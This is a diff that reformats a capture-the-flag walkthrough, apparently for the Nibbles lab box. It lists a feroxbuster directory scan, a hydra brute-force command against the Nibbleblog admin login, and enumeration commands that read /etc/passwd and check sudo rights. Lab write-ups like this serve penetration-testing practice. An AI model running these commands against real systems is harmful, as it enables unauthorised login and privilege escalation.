@@ -24,15 +24,18 @@ Start by scanning the machine for open ports
 Nmap
 
 Use Feroxbuster to find other directories
-• feroxbuster -u http://10.129.62.214/nibbleblog -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt
+
+- feroxbuster -u http://10.129.62.214/nibbleblog -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt
 
 Find username admin in files
-• http://10.129.62.214/nibbleblog/content/private/users.xml
+
+- http://10.129.62.214/nibbleblog/content/private/users.xml
 
 ![alt text](images/image.png)
 
 Use Hydra to brute force passwords
-• hydra -l admin -P ./xato-net-10-million-passwords-10000.txt 10.129.62.214 http-post-form "/nibbleblog/admin.php:username=^USER^&password=^PASS^:Incorrect username"
+
+- hydra -l admin -P ./xato-net-10-million-passwords-10000.txt 10.129.62.214 http-post-form "/nibbleblog/admin.php:username=^USER^&password=^PASS^:Incorrect username"
 
 ![alt text](images/image-1.png)
 
@@ -40,9 +43,10 @@ Try passwords after getting locked out of box and resetting it
 Get access to CLI as user nibbler
 
 Run these commands for enumeration
-• `cat /etc/passwd | grep sh$`
-• `sudo -l`
-• `cat /etc/fstab`
+
+- `cat /etc/passwd | grep sh$`
+- `sudo -l`
+- `cat /etc/fstab`
 
 Find sudoable command for running as root
 •`sudo -l`
